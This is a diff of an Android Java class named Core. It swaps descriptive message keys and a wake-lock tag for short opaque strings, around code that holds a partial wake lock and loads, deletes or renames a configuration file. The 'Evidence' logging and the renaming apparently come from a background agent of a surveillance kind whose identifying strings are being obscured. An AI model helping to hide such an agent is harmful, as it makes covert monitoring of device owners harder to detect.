@@ -88,10 +88,10 @@ public class Core extends Activity implements Runnable {
 		// mRedrawHandler.sleep(1000);
 
 		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
-		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, Messages.getString("Core.0")); //$NON-NLS-1$
+		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
 		wl.acquire();
 
-		Evidence.info(Messages.getString("Core.1")); //$NON-NLS-1$
+		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
 		return true;
 	}
 
@@ -345,10 +345,10 @@ public class Core extends Activity implements Runnable {
 			loaded = loadConfFile(file);
 
 			if (!loaded) {
-				Evidence.info(Messages.getString("Core.2")); //$NON-NLS-1$
+				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
 				file.delete();
 			} else {
-				Evidence.info(Messages.getString("Core.3")); //$NON-NLS-1$
+				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
 				file.rename(Path.conf() + Configuration.ACTUAL_CONF);
 			}
 		}
@@ -359,7 +359,7 @@ public class Core extends Activity implements Runnable {
 			if (file.exists()) {
 				loaded = loadConfFile(file);
 				if (!loaded) {
-					Evidence.info(Messages.getString("Core.4")); //$NON-NLS-1$
+					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
 				}
 			}
 		}
